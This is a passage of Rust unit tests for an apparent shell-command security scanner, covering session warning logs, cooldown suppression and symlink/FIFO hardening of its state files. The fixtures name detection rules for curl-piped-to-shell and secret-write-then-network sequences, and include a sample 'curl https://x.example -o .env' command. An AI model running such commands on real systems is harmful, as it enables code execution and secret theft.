            .contains(&"evil.example.com".to_string()));

        // Record more and verify accumulation
        let f3 = make_finding(RuleId::ShortenedUrl, Severity::Low);
        record_warning(session_id, &[&f3], "bit.ly/foo", &[]);

        let session = load(session_id);
        assert_eq!(session.total_warnings, 3);
        assert_eq!(session.events.len(), 3);

        // Clear and verify
        clear_session(session_id);
        let session = load(session_id);
        assert_eq!(session.total_warnings, 0);

        unsafe { std::env::remove_var("XDG_STATE_HOME") };
    }

    #[test]
    fn test_count_by_rule_with_window() {
        let mut session = SessionWarnings::new("test");
        // Add an event with a recent timestamp
        session.events.push_back(WarningEvent {
            timestamp: chrono::Utc::now().to_rfc3339(),
            rule_id: "curl_pipe_shell".to_string(),
            severity: "HIGH".to_string(),
            title: "test".to_string(),
            command_redacted: "cmd".to_string(),
            domains: vec![],
        });
        // Add an event with an old timestamp (2 hours ago)
        let old_time = (chrono::Utc::now() - chrono::Duration::hours(2)).to_rfc3339();
        session.events.push_back(WarningEvent {
            timestamp: old_time,
            rule_id: "curl_pipe_shell".to_string(),
            severity: "HIGH".to_string(),
            title: "test".to_string(),
            command_redacted: "cmd".to_string(),
            domains: vec![],
        });

        // 60-min window should only catch the recent one
        assert_eq!(session.count_by_rule("curl_pipe_shell", 60), 1);
        // 180-min window should catch both
        assert_eq!(session.count_by_rule("curl_pipe_shell", 180), 2);
        // Different rule should match zero
        assert_eq!(session.count_by_rule("non_ascii_hostname", 180), 0);
    }

    #[test]
    fn test_count_by_rule_and_domain() {
        let mut session = SessionWarnings::new("test");
        session.events.push_back(WarningEvent {
            timestamp: chrono::Utc::now().to_rfc3339(),
            rule_id: "non_ascii_hostname".to_string(),
            severity: "MEDIUM".to_string(),
            title: "test".to_string(),
            command_redacted: "cmd".to_string(),
            domains: vec!["evil.com".to_string()],
        });
        session.events.push_back(WarningEvent {
            timestamp: chrono::Utc::now().to_rfc3339(),
            rule_id: "non_ascii_hostname".to_string(),
            severity: "MEDIUM".to_string(),
            title: "test".to_string(),
            command_redacted: "cmd".to_string(),
            domains: vec!["good.com".to_string()],
        });

        assert_eq!(
            session.count_by_rule_and_domain("non_ascii_hostname", "evil.com", 60),
            1
        );
        assert_eq!(
            session.count_by_rule_and_domain("non_ascii_hostname", "good.com", 60),
            1
        );
        assert_eq!(
            session.count_by_rule_and_domain("non_ascii_hostname", "other.com", 60),
            0
        );
    }

    #[test]
    fn test_count_all() {
        let mut session = SessionWarnings::new("test");
        for _ in 0..5 {
            session.events.push_back(WarningEvent {
                timestamp: chrono::Utc::now().to_rfc3339(),
                rule_id: "any_rule".to_string(),
                severity: "LOW".to_string(),
                title: "test".to_string(),
                command_redacted: "cmd".to_string(),
                domains: vec![],
            });
        }
        assert_eq!(session.count_all(60), 5);
    }

    #[test]
    fn test_top_rules() {
        let mut session = SessionWarnings::new("test");
        for _ in 0..3 {
            session.events.push_back(WarningEvent {
                timestamp: chrono::Utc::now().to_rfc3339(),
                rule_id: "rule_a".to_string(),
                severity: "LOW".to_string(),
                title: "test".to_string(),
                command_redacted: "cmd".to_string(),
                domains: vec![],
            });
        }
        session.events.push_back(WarningEvent {
            timestamp: chrono::Utc::now().to_rfc3339(),
            rule_id: "rule_b".to_string(),
            severity: "LOW".to_string(),
            title: "test".to_string(),
            command_redacted: "cmd".to_string(),
            domains: vec![],
        });

        let top = session.top_rules();
        assert_eq!(top[0], ("rule_a".to_string(), 3));
        assert_eq!(top[1], ("rule_b".to_string(), 1));
    }

    #[test]
    fn test_event_cap() {
        let mut session = SessionWarnings::new("test");
        for i in 0..150 {
            session.events.push_back(WarningEvent {
                timestamp: chrono::Utc::now().to_rfc3339(),
                rule_id: format!("rule_{i}"),
                severity: "LOW".to_string(),
                title: "test".to_string(),
                command_redacted: "cmd".to_string(),
                domains: vec![],
            });
            session.total_warnings += 1;
        }
        // Manually apply cap as record_warning would
        while session.events.len() > MAX_EVENTS {
            session.events.pop_front();
        }
        assert_eq!(session.events.len(), MAX_EVENTS);
        assert_eq!(session.total_warnings, 150);
    }

    #[test]
    fn test_extract_domains_from_evidence() {
        let evidence = vec![
            Evidence::Url {
                raw: "https://evil.example.com/path".to_string(),
            },
            Evidence::HostComparison {
                raw_host: "GITHUB.COM".to_string(),
                similar_to: "g1thub.com".to_string(),
            },
            Evidence::Text {
                detail: "irrelevant".to_string(),
            },
        ];
        let domains = extract_domains_from_evidence(&evidence);
        assert!(domains.contains(&"evil.example.com".to_string()));
        assert!(domains.contains(&"github.com".to_string()));
        assert_eq!(domains.len(), 2);
    }

    #[test]
    fn suppress_check_is_session_backed() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
            std::env::set_var("TIRITH_LOG", "0");
        }
        let sid = "test-suppress-1";
        // First sighting starts the cooldown and is NOT suppressed.
        assert!(!suppress_check(sid, "curl_pipe_shell", None, 3600));
        // A separate call (a fresh one-shot process behaves the same) reads the
        // persisted cooldown and reports suppressed.
        assert!(suppress_check(sid, "curl_pipe_shell", None, 3600));
        // A different rule is independent.
        assert!(!suppress_check(sid, "other_rule", None, 3600));
        // The cooldown is persisted on the session record.
        let sw = load(sid);
        assert!(sw.cooldowns.contains_key("curl_pipe_shell"));
        unsafe {
            std::env::remove_var("XDG_STATE_HOME");
            std::env::remove_var("TIRITH_LOG");
        }
    }

    #[test]
    fn suppress_check_clamps_overflowing_cooldown() {
        // A `cooldown_secs` above i64::MAX must NOT wrap negative (which would
        // place the expiry in the past and instantly expire the cooldown). After
        // clamping, the first sighting starts a far-future cooldown and the second
        // sighting (same key) is suppressed.
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
            std::env::set_var("TIRITH_LOG", "0");
        }
        let sid = "test-suppress-overflow";
        // u64::MAX would overflow i64; the clamp keeps the expiry in the future.
        assert!(!suppress_check(sid, "curl_pipe_shell", None, u64::MAX));
        assert!(
            suppress_check(sid, "curl_pipe_shell", None, u64::MAX),
            "an overflowing cooldown must clamp (not wrap negative) and stay active"
        );
        // The persisted expiry parses as a real, future RFC3339 instant.
        let sw = load(sid);
        let expiry = sw
            .cooldowns
            .get("curl_pipe_shell")
            .expect("cooldown persisted");
        let parsed = chrono::DateTime::parse_from_rfc3339(expiry).expect("expiry is valid RFC3339");
        assert!(
            parsed > chrono::Utc::now(),
            "clamped expiry must be in the future, got {expiry}"
        );
        unsafe {
            std::env::remove_var("XDG_STATE_HOME");
            std::env::remove_var("TIRITH_LOG");
        }
    }

    /// W6 safety contract: a SUPPRESSED hit must emit a compact
    /// `finding_suppressed` audit rollup (the "never dropped silently"
    /// guarantee). Drives `suppress_check` with logging ENABLED and reads the
    /// audit log back to assert the rollup landed.
    #[cfg(unix)]
    #[test]
    fn suppress_check_emits_finding_suppressed_rollup() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        // Isolate BOTH state (session record) and data (audit log) into the temp
        // dir, and ENABLE logging so the rollup is actually written.
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path().join("state"));
            std::env::set_var("XDG_DATA_HOME", dir.path().join("data"));
            std::env::set_var("TIRITH_LOG", "1");
        }

        let result = std::panic::catch_unwind(|| {
            let sid = "test-suppress-rollup";
            // First sighting starts the cooldown, is NOT suppressed, emits nothing.
            assert!(!suppress_check(sid, "curl_pipe_shell", None, 3600));
            // Second sighting is suppressed -> must emit the rollup.
            assert!(suppress_check(sid, "curl_pipe_shell", None, 3600));

            let log = crate::audit::audit_log_path().expect("audit log path");
            let body = std::fs::read_to_string(&log).expect("audit log written");
            let rollup = body.lines().find(|l| l.contains("finding_suppressed"));
            let rollup = rollup.expect("a finding_suppressed rollup line must exist");
            let v: serde_json::Value =
                serde_json::from_str(rollup).expect("rollup line is valid JSON");
            assert_eq!(v["event"], "finding_suppressed");
            assert_eq!(v["hook_type"], "cooldown");
            assert_eq!(v["integration"], "suppression");
            assert!(
                v["detail"]
                    .as_str()
                    .map(|d| d.contains("rule_id=curl_pipe_shell"))
                    .unwrap_or(false),
                "rollup detail must carry the rule id: {v}"
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            std::env::remove_var("XDG_STATE_HOME");
            std::env::remove_var("XDG_DATA_HOME");
            std::env::remove_var("TIRITH_LOG");
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// H12 crash-atomic write: after a `with_session_locked` mutation the session
    /// file must be FULLY replaced (parses, carries the mutation) via temp+rename,
    /// leaving NO stray temp sibling in the sessions dir; and a SECOND mutation on
    /// the same session must still apply (the dedicated-lock-file + atomic-rename
    /// design keeps concurrent-safe semantics). The old in-place truncate could
    /// leave the file empty after a crash between `set_len(0)` and the write.
    #[cfg(unix)]
    #[test]
    fn with_session_locked_write_is_atomic_and_leaves_no_temp() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        let prev_state = std::env::var("XDG_STATE_HOME").ok();
        let prev_log = std::env::var("TIRITH_LOG").ok();
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
            std::env::set_var("TIRITH_LOG", "0");
        }

        let result = std::panic::catch_unwind(|| {
            let sid = "h12-atomic-session";
            // First mutation: starts a cooldown (writes `curl_pipe_shell` -> expiry).
            assert!(!suppress_check(sid, "curl_pipe_shell", None, 3600));

            let path = session_state_path(sid).expect("session path");
            let sessions_dir = path.parent().expect("sessions dir").to_path_buf();

            // The session file is fully written: it parses and carries the mutation.
            let body = std::fs::read_to_string(&path).expect("session file written");
            let parsed: SessionWarnings = serde_json::from_str(&body).expect("session file parses");
            assert!(
                parsed.cooldowns.contains_key("curl_pipe_shell"),
                "the mutation (cooldown) must be present in the persisted session"
            );

            // No leftover temp sibling from the temp+rename remains in the dir: a
            // `NamedTempFile` that was written but never `persist`ed (the crash/error
            // path) would survive as a `.tmpXXXXXX` file. (`.last_gc`, the session
            // JSON, and the `.json.lock` are legitimate persistent entries.)
            let temp_leaks: Vec<_> = std::fs::read_dir(&sessions_dir)
                .expect("read sessions dir")
                .filter_map(|e| e.ok())
                .map(|e| e.file_name().to_string_lossy().into_owned())
                .filter(|n| n.starts_with(".tmp"))
                .collect();
            assert!(
                temp_leaks.is_empty(),
                "no temp sibling must remain after the atomic rename: {temp_leaks:?}"
            );

            // A SECOND mutation in the same session still applies: a second distinct
            // rule starts its own cooldown, and the first cooldown is preserved.
            assert!(!suppress_check(sid, "dotfile_overwrite", None, 3600));
            let body2 = std::fs::read_to_string(&path).expect("session file rewritten");
            let parsed2: SessionWarnings =
                serde_json::from_str(&body2).expect("rewritten session parses");
            assert!(
                parsed2.cooldowns.contains_key("curl_pipe_shell")
                    && parsed2.cooldowns.contains_key("dotfile_overwrite"),
                "the second mutation must apply without dropping the first: {:?}",
                parsed2.cooldowns
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            match prev_state {
                Some(v) => std::env::set_var("XDG_STATE_HOME", v),
                None => std::env::remove_var("XDG_STATE_HOME"),
            }
            match prev_log {
                Some(v) => std::env::set_var("TIRITH_LOG", v),
                None => std::env::remove_var("TIRITH_LOG"),
            }
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// Security: a SYMLINK planted at the session LOCK path must be refused, so
    /// lock identity cannot be redirected to an attacker-chosen inode (which would
    /// break the serialization guarantee for concurrent writers). The guarded
    /// `with_session_locked` must skip the mutation entirely: it neither writes
    /// through the symlink nor persists the session data file.
    #[cfg(unix)]
    #[test]
    fn with_session_locked_refuses_symlinked_lock() {
        use crate::event_buffer::{EventKind, TypedEvent};

        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        let prev_state = std::env::var("XDG_STATE_HOME").ok();
        let prev_log = std::env::var("TIRITH_LOG").ok();
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
            std::env::set_var("TIRITH_LOG", "0");
        }

        let result = std::panic::catch_unwind(|| {
            let sid = "symlinked-lock-session";
            let path = session_state_path(sid).expect("session path");
            let lock_path = session_lock_path(sid).expect("lock path");
            let sessions_dir = path.parent().expect("sessions dir").to_path_buf();
            std::fs::create_dir_all(&sessions_dir).expect("create sessions dir");

            // A sentinel OUTSIDE the sessions dir; the lock symlink targets it, so a
            // followed open would create/clobber it instead of the real lock inode.
            let outside = dir.path().join("outside-lock-target");
            std::os::unix::fs::symlink(&outside, &lock_path).expect("plant lock symlink");

            // Drive a locked mutation. The symlinked lock must be refused, so the
            // mutation is skipped: no session data file is written.
            record_typed_event(
                sid,
                TypedEvent::new(
                    &chrono::Utc::now().to_rfc3339(),
                    EventKind::Network,
                    "network_egress",
                ),
            );

            assert!(
                !path.exists(),
                "a refused symlinked lock must skip the mutation: session file must not be written"
            );
            assert!(
                !outside.exists(),
                "the lock open must not have been followed through the symlink to the sentinel"
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            match prev_state {
                Some(v) => std::env::set_var("XDG_STATE_HOME", v),
                None => std::env::remove_var("XDG_STATE_HOME"),
            }
            match prev_log {
                Some(v) => std::env::set_var("TIRITH_LOG", v),
                None => std::env::remove_var("TIRITH_LOG"),
            }
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// W6: `suppress_check` must prune ALL expired cooldown entries, not only the
    /// key under test, so `cooldowns` cannot grow unbounded across many distinct
    /// rule/target keys in a long-lived session.
    #[cfg(unix)]
    #[test]
    fn suppress_check_prunes_expired_cooldowns_globally() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        let prev_state = std::env::var("XDG_STATE_HOME").ok();
        let prev_log = std::env::var("TIRITH_LOG").ok();
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
            std::env::set_var("TIRITH_LOG", "0");
        }

        let result = std::panic::catch_unwind(|| {
            let sid = "prune-cooldowns-session";
            // Seed an EXPIRED cooldown for a DIFFERENT key (far-past expiry).
            with_session_locked(sid, |sw| {
                sw.cooldowns.insert(
                    "old::expired".to_string(),
                    "2000-01-01T00:00:00+00:00".to_string(),
                );
            });
            assert!(load(sid).cooldowns.contains_key("old::expired"));

            // A suppression check for a NEW key must prune the unrelated expired entry.
            suppress_check(sid, "new_rule", None, 3600);
            let after = load(sid).cooldowns;
            assert!(
                !after.contains_key("old::expired"),
                "an expired cooldown for another key must be pruned globally"
            );
            assert!(
                after.keys().any(|k| k.contains("new_rule")),
                "the new key's cooldown is recorded"
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            match prev_state {
                Some(v) => std::env::set_var("XDG_STATE_HOME", v),
                None => std::env::remove_var("XDG_STATE_HOME"),
            }
            match prev_log {
                Some(v) => std::env::set_var("TIRITH_LOG", v),
                None => std::env::remove_var("TIRITH_LOG"),
            }
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// Security: a SYMLINK planted at the session DATA file path must be refused so
    /// the read/write never follows it to a foreign inode. The mutation is skipped:
    /// the symlink target is not written through and the path stays the symlink.
    #[cfg(unix)]
    #[test]
    fn with_session_locked_refuses_symlinked_session_file() {
        use crate::event_buffer::{EventKind, TypedEvent};

        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        let prev_state = std::env::var("XDG_STATE_HOME").ok();
        let prev_log = std::env::var("TIRITH_LOG").ok();
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
            std::env::set_var("TIRITH_LOG", "0");
        }

        let result = std::panic::catch_unwind(|| {
            let sid = "symlinked-session-file";
            let path = session_state_path(sid).expect("session path");
            let sessions_dir = path.parent().expect("sessions dir").to_path_buf();
            std::fs::create_dir_all(&sessions_dir).expect("create sessions dir");

            // A sentinel OUTSIDE the sessions dir; the session symlink targets it, so a
            // followed read/write would touch it instead of the real session inode.
            let outside = dir.path().join("outside-session-target");
            std::fs::write(&outside, "{}").expect("write sentinel");
            std::os::unix::fs::symlink(&outside, &path).expect("plant session symlink");

            record_typed_event(
                sid,
                TypedEvent::new(
                    &chrono::Utc::now().to_rfc3339(),
                    EventKind::Network,
                    "network_egress",
                ),
            );

            assert_eq!(
                std::fs::read_to_string(&outside).expect("sentinel readable"),
                "{}",
                "a refused symlinked session file must not be written through to the target"
            );
            assert!(
                std::fs::symlink_metadata(&path)
                    .expect("path meta")
                    .file_type()
                    .is_symlink(),
                "the session path must remain the (refused) symlink, not be replaced"
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            match prev_state {
                Some(v) => std::env::set_var("XDG_STATE_HOME", v),
                None => std::env::remove_var("XDG_STATE_HOME"),
            }
            match prev_log {
                Some(v) => std::env::set_var("TIRITH_LOG", v),
                None => std::env::remove_var("TIRITH_LOG"),
            }
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// Security: `load()` is the PUBLIC read path (`tirith warnings`). A SYMLINK
    /// planted at the session JSON must NOT be followed to a foreign file; the
    /// O_NOFOLLOW open refuses it and `load` returns a fresh (empty) accumulator, so
    /// `tirith warnings` never renders an outside session's contents.
    #[cfg(unix)]
    #[test]
    fn load_refuses_symlinked_session_file() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        let prev_state = std::env::var("XDG_STATE_HOME").ok();
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
        }

        let result = std::panic::catch_unwind(|| {
            let sid = "symlink-read";
            let path = session_state_path(sid).expect("session path");
            let sessions_dir = path.parent().expect("sessions dir").to_path_buf();
            std::fs::create_dir_all(&sessions_dir).expect("create sessions dir");

            // An OUTSIDE session JSON with a recognizable marker; the session path is
            // a symlink to it. A FOLLOWED read would surface total_warnings = 4242.
            let outside = dir.path().join("outside-session.json");
            std::fs::write(
                &outside,
                r#"{"session_id":"foreign","session_start":"2020-01-01T00:00:00+00:00","total_warnings":4242,"events":[]}"#,
            )
            .expect("write outside session");
            std::os::unix::fs::symlink(&outside, &path).expect("plant session symlink");

            let loaded = load(sid);
            assert_eq!(
                loaded.total_warnings, 0,
                "load() must refuse a symlinked session file, not surface the foreign session"
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            match prev_state {
                Some(v) => std::env::set_var("XDG_STATE_HOME", v),
                None => std::env::remove_var("XDG_STATE_HOME"),
            }
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// Security: `load()` must refuse a NON-REGULAR session file (FIFO / device /
    /// socket) and never block. A FIFO at the session path would hang a plain blocking
    /// read; the no-follow + O_NONBLOCK + regular-file helper returns immediately and
    /// `load` yields a fresh accumulator. (This test would HANG if the fix regressed.)
    #[cfg(unix)]
    #[test]
    fn load_refuses_fifo_session_file() {
        use std::os::unix::ffi::OsStrExt;
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        let prev_state = std::env::var("XDG_STATE_HOME").ok();
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
        }

        let result = std::panic::catch_unwind(|| {
            let sid = "fifo-read";
            let path = session_state_path(sid).expect("session path");
            let sessions_dir = path.parent().expect("sessions dir").to_path_buf();
            std::fs::create_dir_all(&sessions_dir).expect("create sessions dir");

            // Plant a FIFO at the session path; a blocking read would hang here.
            let c = std::ffi::CString::new(path.as_os_str().as_bytes()).expect("cstring");
            assert_eq!(
                unsafe { libc::mkfifo(c.as_ptr(), 0o600) },
                0,
                "mkfifo failed"
            );

            let loaded = load(sid);
            assert_eq!(
                loaded.total_warnings, 0,
                "a FIFO session file must yield a fresh accumulator, not hang or be read"
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            match prev_state {
                Some(v) => std::env::set_var("XDG_STATE_HOME", v),
                None => std::env::remove_var("XDG_STATE_HOME"),
            }
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// Security: `with_session_locked` (the writer path) must likewise refuse a
    /// NON-REGULAR session file, so a planted FIFO cannot block `record_warning` /
    /// `suppress_check`. The mutation is skipped (no hang; the FIFO is not written
    /// through and the path stays a FIFO).
    #[cfg(unix)]
    #[test]
    fn with_session_locked_refuses_fifo_session_file() {
        use crate::event_buffer::{EventKind, TypedEvent};
        use std::os::unix::ffi::OsStrExt;
        use std::os::unix::fs::FileTypeExt;
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        let prev_state = std::env::var("XDG_STATE_HOME").ok();
        let prev_log = std::env::var("TIRITH_LOG").ok();
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
            std::env::set_var("TIRITH_LOG", "0");
        }

        let result = std::panic::catch_unwind(|| {
            let sid = "fifo-write";
            let path = session_state_path(sid).expect("session path");
            let sessions_dir = path.parent().expect("sessions dir").to_path_buf();
            std::fs::create_dir_all(&sessions_dir).expect("create sessions dir");

            let c = std::ffi::CString::new(path.as_os_str().as_bytes()).expect("cstring");
            assert_eq!(
                unsafe { libc::mkfifo(c.as_ptr(), 0o600) },
                0,
                "mkfifo failed"
            );

            record_typed_event(
                sid,
                TypedEvent::new(
                    &chrono::Utc::now().to_rfc3339(),
                    EventKind::Network,
                    "network_egress",
                ),
            );

            assert!(
                std::fs::symlink_metadata(&path)
                    .expect("path meta")
                    .file_type()
                    .is_fifo(),
                "the session path must remain the (refused) FIFO; the mutation was skipped"
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            match prev_state {
                Some(v) => std::env::set_var("XDG_STATE_HOME", v),
                None => std::env::remove_var("XDG_STATE_HOME"),
            }
            match prev_log {
                Some(v) => std::env::set_var("TIRITH_LOG", v),
                None => std::env::remove_var("TIRITH_LOG"),
            }
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// Consistency: a session JSON carrying RAW invalid UTF-8 inside a string must be
    /// treated as corrupt by BOTH the reader (`load`) and the writer
    /// (`with_session_locked`). Previously the writer lossy-decoded the bytes to
    /// U+FFFD via `from_utf8_lossy` and persisted the mangled state, while `load`
    /// (from_slice) rejected it. Both now use `from_slice` and reset to a fresh
    /// accumulator.
    #[cfg(unix)]
    #[test]
    fn reader_and_writer_treat_invalid_utf8_session_identically() {
        use crate::event_buffer::{EventKind, TypedEvent};
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        let prev_state = std::env::var("XDG_STATE_HOME").ok();
        let prev_log = std::env::var("TIRITH_LOG").ok();
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
            std::env::set_var("TIRITH_LOG", "0");
        }

        let result = std::panic::catch_unwind(|| {
            let sid = "invalid-utf8";
            let path = session_state_path(sid).expect("session path");
            std::fs::create_dir_all(path.parent().expect("sessions dir")).expect("mkdir");

            // Structurally valid JSON whose session_id string holds a raw 0xFF byte
            // (invalid UTF-8) plus a recognizable total_warnings = 7.
            let mut corrupt = br#"{"session_id":"x"#.to_vec();
            corrupt.push(0xFF);
            corrupt.extend_from_slice(
                br#"","session_start":"2020-01-01T00:00:00+00:00","total_warnings":7,"events":[]}"#,
            );
            std::fs::write(&path, &corrupt).expect("write corrupt session");

            // READER: load() rejects invalid UTF-8 as corrupt -> fresh.
            assert_eq!(
                load(sid).total_warnings,
                0,
                "reader must treat an invalid-UTF-8 session as corrupt, not surface total=7"
            );

            // WRITER: a mutation reads it the SAME way (corrupt -> fresh), records the
            // new event, and rewrites a CLEAN session. The persisted bytes must no
            // longer contain 0xFF, and a re-load must not carry the corrupt total=7.
            record_typed_event(
                sid,
                TypedEvent::new(
                    &chrono::Utc::now().to_rfc3339(),
                    EventKind::Network,
                    "network_egress",
                ),
            );
            let after = std::fs::read(&path).expect("read rewritten session");
            assert!(
                !after.contains(&0xFF),
                "writer must not persist lossy-decoded corrupt bytes"
            );
            assert_eq!(
                load(sid).total_warnings,
                0,
                "writer must have reset the corrupt session, not preserved total=7"
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            match prev_state {
                Some(v) => std::env::set_var("XDG_STATE_HOME", v),
                None => std::env::remove_var("XDG_STATE_HOME"),
            }
            match prev_log {
                Some(v) => std::env::set_var("TIRITH_LOG", v),
                None => std::env::remove_var("TIRITH_LOG"),
            }
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// W7 atomicity: when `correlate_session` returns a fresh hit, the SAME
    /// session record must ALREADY hold both the de-dup signature AND the
    /// `WarningEvent` — with no second call. The previous design marked the
    /// signature in one write and appended the warning event in a separate
    /// best-effort write, so a crash between them dropped the hit from
    /// `tirith warnings` forever. Folding both into one locked mutation closes it.
    #[cfg(unix)]
    #[test]
    fn correlate_session_persists_marker_and_warning_atomically() {
        use crate::event_buffer::{EventKind, TypedEvent};

        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
            std::env::set_var("TIRITH_LOG", "0");
        }

        let result = std::panic::catch_unwind(|| {
            let session_id = "w7-atomic-correlation";
            // Seed a SecretWrite THEN a strictly-later Network, both inside the
            // 30s window, so `correlate` yields a SecretWriteThenNetwork hit.
            let base = chrono::Utc::now();
            let t_secret = (base - chrono::Duration::seconds(10)).to_rfc3339();
            let t_net = (base - chrono::Duration::seconds(5)).to_rfc3339();
            record_typed_event(
                session_id,
                TypedEvent::new(&t_secret, EventKind::SecretWrite, "secret_file_write"),
            );
            record_typed_event(
                session_id,
                TypedEvent::new(&t_net, EventKind::Network, "network_egress"),
            );

            let policy = crate::policy::Policy::default();
            let hits =
                correlate_session(session_id, "curl https://x.example -o .env", &policy, &[]);
            let hit = hits
                .iter()
                .find(|h| h.rule_id == RuleId::SecretWriteThenNetwork)
                .expect("the seeded sequence must surface a SecretWriteThenNetwork hit");
            let signature = hit.signature.clone();

            // Load the session FRESH (no further correlate call): both the marker
            // and the warning event must already be persisted together.
            let session = load(session_id);
            assert!(
                session
                    .surfaced_correlations
                    .iter()
                    .any(|s| s == &signature),
                "the de-dup signature must be persisted: {:?}",
                session.surfaced_correlations
            );
            assert!(
                session
                    .events
                    .iter()
                    .any(|e| e.rule_id == RuleId::SecretWriteThenNetwork.to_string()),
                "the WarningEvent must be persisted in the SAME record as the marker: {:?}",
                session
                    .events
                    .iter()
                    .map(|e| &e.rule_id)
                    .collect::<Vec<_>>()
            );
            assert_eq!(
                session.total_warnings, 1,
                "the surfaced correlation must bump total_warnings exactly once"
            );

            // And the dedup holds: a second correlate over the same (still in
            // window) ring surfaces nothing and adds no duplicate warning event.
            let again =
                correlate_session(session_id, "curl https://x.example -o .env", &policy, &[]);
            assert!(
                !again
                    .iter()
                    .any(|h| h.rule_id == RuleId::SecretWriteThenNetwork),
                "an already-surfaced correlation must not re-emit"
            );
            let session = load(session_id);
            assert_eq!(
                session
                    .events
                    .iter()
                    .filter(|e| e.rule_id == RuleId::SecretWriteThenNetwork.to_string())
                    .count(),
                1,
                "the warning event must not be duplicated on a re-correlate"
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            std::env::remove_var("XDG_STATE_HOME");
            std::env::remove_var("TIRITH_LOG");
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// W7 (E3): a surfaced correlation must stay DEDUPED for as long as its source
    /// events remain in the typed-event window, even after MANY other distinct
    /// correlations are surfaced. The previous design capped `surfaced_correlations`
    /// at an INDEPENDENT 100, smaller than the 200-event window: once >100 fresh
    /// hits were surfaced, the original signature was evicted while its SOURCE events
    /// were still in-window and still correlatable, so the next command re-emitted
    /// and double-counted it. Eviction is now lockstep with the event window, so the
    /// original survives. This drives well past the OLD 100 cap to prove it.
    #[cfg(unix)]
    #[test]
    fn surfaced_correlation_not_re_emitted_while_source_events_live() {
        use crate::event_buffer::{EventKind, TypedEvent};

        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
            std::env::set_var("TIRITH_LOG", "0");
        }

